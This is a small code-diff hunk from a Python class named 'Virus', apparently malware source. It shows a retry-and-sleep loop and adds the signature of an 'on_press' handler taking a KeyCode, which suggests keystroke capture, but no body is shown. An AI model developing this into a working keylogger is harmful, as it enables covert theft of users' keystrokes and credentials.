@@ -83,3 +83,5 @@ class Virus(object):
                 except Exception:
                     time.sleep(1)
                     continue
+
+    def on_press(self, key: KeyCode):
